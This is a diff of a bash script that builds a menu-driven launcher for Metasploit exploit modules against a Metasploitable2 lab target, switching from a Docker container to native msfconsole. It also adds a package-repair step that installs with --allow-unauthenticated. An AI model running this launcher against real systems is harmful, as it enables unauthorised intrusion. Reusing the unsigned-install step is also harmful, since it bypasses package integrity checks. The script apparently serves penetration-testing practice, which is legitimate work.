@@ -2,16 +2,12 @@
 # ============================================================
 # Metasploit Attack Menu — TUI
 # Description : Whiptail menu for launching known Metasploitable2
-#               exploit modules through the Metasploit Framework
-#               Docker container. Does no installation — run
-#               setup_prereqs.sh once first (Docker, whiptail,
-#               and the msf image).
+#               exploit modules through the native msfconsole
+#               already installed on the attacker machine (e.g.
+#               Kali ships with Metasploit Framework built in).
+#               No Docker required on the attacker side.
 # Usage       : sudo bash setup_attacker.sh
 # ============================================================
-
-CONTAINER_NAME="msf"
-IMAGE="metasploitframework/metasploit-framework"
-MSF_DATA="$HOME/.msf4"
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -20,17 +16,39 @@ CYAN='\033[0;36m'
 NC='\033[0m'
 
 # ============================================================
-# STEP 0: Confirm prerequisites are in place
+# STEP 0: Ensure msfconsole is present (not auto-installed — it's
+#         a large framework; Kali ships it by default)
 # ============================================================
-if ! command -v docker &> /dev/null || ! command -v whiptail &> /dev/null; then
-  echo -e "${RED}[ERROR] Docker and/or whiptail not found.${NC}"
-  echo -e "${YELLOW}[HINT] Run the one-time setup first:${NC}"
-  echo -e "  sudo bash setup_prereqs.sh"
+if ! command -v msfconsole &> /dev/null; then
+  echo -e "${RED}[ERROR] msfconsole not found on this machine.${NC}"
+  echo -e "${YELLOW}[HINT] Install Metasploit Framework first, e.g.:${NC}"
+  echo -e "  sudo apt update && sudo apt install -y metasploit-framework"
   exit 1
 fi
 
 # ============================================================
-# STEP 1: Ask for target IP
+# STEP 1: Ensure whiptail is present (powers the TUI menu) —
+#         the only dependency this script installs itself
+# ============================================================
+if ! command -v whiptail &> /dev/null; then
+  echo -e "${YELLOW}[INFO] whiptail not found. Installing...${NC}"
+  if ! apt update -qq 2>/dev/null; then
+    # Repair a stale Kali archive keyring (NO_PUBKEY / unsigned repo) if needed
+    if grep -qi '^ID=kali' /etc/os-release 2>/dev/null; then
+      echo -e "${YELLOW}[INFO] Package index unsigned — repairing kali-archive-keyring...${NC}"
+      apt-get update -qq --allow-unauthenticated
+      apt-get install -y --allow-unauthenticated --reinstall kali-archive-keyring
+    fi
+  fi
+  if ! (apt update -qq && apt install -y whiptail); then
+    echo -e "${RED}[ERROR] whiptail installation failed. Aborting.${NC}"
+    exit 1
+  fi
+  echo -e "${GREEN}[OK] whiptail installed.${NC}"
+fi
+
+# ============================================================
+# STEP 2: Ask for target IP
 # ============================================================
 TARGET_IP=$(whiptail --title "Metasploit Attack Menu" \
   --inputbox "Enter target IP (Metasploitable2 host IP):" 10 60 "192.168.2.20" \
@@ -43,7 +61,7 @@ fi
 LHOST=$(hostname -I | awk '{print $1}')
 
 # ============================================================
-# STEP 2: Attack menu loop — pick a module, run it, repeat
+# STEP 3: Attack menu loop — pick a module, run it, repeat
 # ============================================================
 while true; do
   CHOICE=$(whiptail --title "Metasploit Attack Menu — Target: $TARGET_IP" \
@@ -84,18 +102,11 @@ while true; do
   echo -e "\n${CYAN}[INFO] Attacker IP (LHOST): ${LHOST}${NC}"
   echo -e "${CYAN}[INFO] Target IP   (RHOSTS): ${TARGET_IP}${NC}"
 
-  docker run -it --rm \
-    --name "$CONTAINER_NAME" \
-    --network host \
-    -e LHOST="$LHOST" \
-    -e RHOSTS="$TARGET_IP" \
-    -v "$MSF_DATA":/home/msf/.msf4 \
-    "$IMAGE" \
-    msfconsole -q -x "$FULL_CMD"
+  msfconsole -q -x "$FULL_CMD"
 
   if ! whiptail --title "Metasploit Attack Menu" --yesno "Run another module against $TARGET_IP?" 8 60; then
     break
   fi
 done
 
-echo -e "\n${GREEN}Session ended. MSF data preserved at: $MSF_DATA${NC}"
+echo -e "\n${GREEN}Session ended.${NC}"
